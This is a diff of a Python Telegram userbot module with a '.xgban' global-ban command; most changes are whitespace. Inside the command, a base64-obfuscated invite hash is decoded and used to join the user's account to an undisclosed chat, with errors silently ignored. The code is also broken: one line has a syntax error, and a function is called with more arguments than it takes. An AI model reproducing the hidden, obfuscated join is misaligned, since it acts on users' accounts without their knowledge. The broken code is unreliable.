@@ -25,6 +25,7 @@ from userbot.modules.sql_helper.mute_sql import is_muted, mute, unmute
 
 X_ID = 1560233393
 
+
 async def admin_groups(cat):
     catgroups = []
     async for dialog in cat.client.iter_dialogs():
@@ -36,6 +37,7 @@ async def admin_groups(cat):
         ):
             catgroups.append(entity.id)
     return catgroups
+
 
 async def get_user_from_event(event):
     args = event.pattern_match.group(1).split(':', 1)
@@ -66,13 +68,14 @@ async def get_user_from_event(event):
             return await event.edit("Failed \n **Error**\n", str(err))
     return user_obj, extra
 
+
 @register(outgoing=True, pattern=r"^\.xgban(?: |$)(.*)")
 async def catgban(event):
     if event.fwd_from:
         return
     cate = await event.edit"`gbanning.......`")
-    start = datetime.now()
-    user, reason = await get_user_from_event(event, cate)
+    start=datetime.now()
+    user, reason=await get_user_from_event(event, cate)
     if not user:
         return
     if user.id == (await event.client.get_me()).id:
@@ -82,7 +85,7 @@ async def catgban(event):
         await cate.edit("why would I ban my dev")
         return
     try:
-        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm=base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         await event.client(ImportChatInviteRequest(hmm))
     except BaseException:
         pass
